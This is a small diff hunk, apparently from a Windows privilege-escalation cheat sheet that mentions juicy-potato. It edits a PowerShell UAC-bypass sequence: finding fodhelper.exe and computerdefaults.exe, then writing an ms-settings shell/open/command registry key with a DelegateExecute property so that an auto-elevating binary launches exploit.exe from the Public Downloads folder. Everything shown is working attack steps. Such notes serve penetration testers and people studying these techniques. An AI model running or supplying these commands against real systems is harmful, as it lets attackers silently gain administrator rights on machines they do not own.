@@ -932,7 +932,7 @@ https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 where /r C:\windows fodhelper.exe
 where /r C:\windows computerdefaults.exe
 
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Path\to\Exploit\exploit.exe} -Force
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Users\Public\Downloads\exploit.exe} -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 cmd
 
